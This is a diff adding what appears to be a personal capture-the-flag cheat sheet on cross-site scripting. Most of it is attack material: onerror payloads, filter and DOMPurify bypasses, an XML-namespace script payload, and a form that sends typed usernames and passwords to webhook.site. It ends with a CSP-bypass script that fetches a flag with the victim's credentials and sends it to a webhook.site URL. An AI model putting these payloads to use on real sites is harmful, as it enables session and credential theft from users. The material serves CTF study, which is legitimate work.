@@ -1,0 +1,105 @@
+* XSS
+
+  @code 
+  document.location
+  <img src=asdf onerror=alert(1)
+  new Image().src
+  fetch()
+  @end
+
+  @code html
+  <form action="/login">
+      <input type="text" name="username" onchange="fetch('webhook.site?'+this.value)">
+      <input type="text" name="password" onchange="fetch('webhook.site?'+this.value)">
+  </form>
+  @end
+
+  ** Filters
+
+*** No < and >
+
+    Using these special characters: `＜` and `＞` or other similar characters. If you're lucky, the backend will accidentally convert these to actual angle brackets
+
+*** Blacklisted functions
+
+    @code
+    `eval`
+    `Function`
+    @end
+
+*** Tag blacklist
+
+    @code html
+    <script x>
+    <script x>alert(1)</script y>
+    @end
+    @code html
+    <sCrIpt>
+    @end
+
+*** Base overwrite
+
+    @code html
+    <base href="webhook.site">
+    @end
+
+    Note: this does not help in bypassing CSP! The CSP at this point has already been loaded, so src will still point to the
+    original site's source.
+
+*** Modification to text
+
+    Certain characters (like ß and ﬃ) count as a single character, but become multiple characters when uppercased (SS
+    and FFI). This is useful in very limited contexts, such as when the length of the initial string is used to iterate
+    through the modified string later on. By spamming the special characters at the start, you can "push" your XSS
+    payload back, so any filters in place doesn't detect/remove your payload. 
+
+    Refer to: [blazing fast]{https://smitop.com/p/dctf22-blazingfast/} 
+
+* XML XSS
+
+  The usual XSS doesn't work in XML, for example `Content-Type: image/svg+xml`. To exploit this, we can use the
+  following payload:
+
+  @code html
+  <html>
+      <head></head>
+      <body>
+          <a:script xmlns:a="https://www.w3.org/1999/xhtml">alert(1)</a:script>
+      </body>
+  </html>
+  @end
+
+  ** Quirks
+
+  If you pass innerText to innerHTML, you can actually bypass DOMPurify with entity encoding.
+  Ref: nutshell.js, `linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(':')+1); // VULN!!`
+
+  @code html
+  <p id=a>&lt;img src=asdf onerror=alert(1)%gt;</p>
+  @end
+
+  @code javascript
+  a.innerHTML = a.innerText
+  @end
+
+  * CSP bypass
+
+  ** Error 431
+
+  Error 431 - Request headers too long. You can try appending a super long query string to the URL, which might cause the CSP to not be loaded on the page. This must be done in an iframe.
+
+  eg. 
+  @code javascript
+  var f=document.createElement('iframe');
+f.src = `http://localhost:3000/js/index.js?q=${'a'.repeat(20000)}`;
+document.body.appendChild(f);
+f.onload = () => {    
+    f.contentWindow.fetch('/flag', { headers: {'X-FLAG': 'a'}, credentials:'include' })
+        .then(res => res.text())
+        .then(flag => location='https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='+flag)
+}
+@end
+
+When a response code related to error 431 occurs, the browser checks whether there is any response body data and, if it exists, renders that data.
+However, if the response body is empty, it redirects the page to chrome-error://chromewebdata/.
+But it seems that the redirect does not work within an iframe.
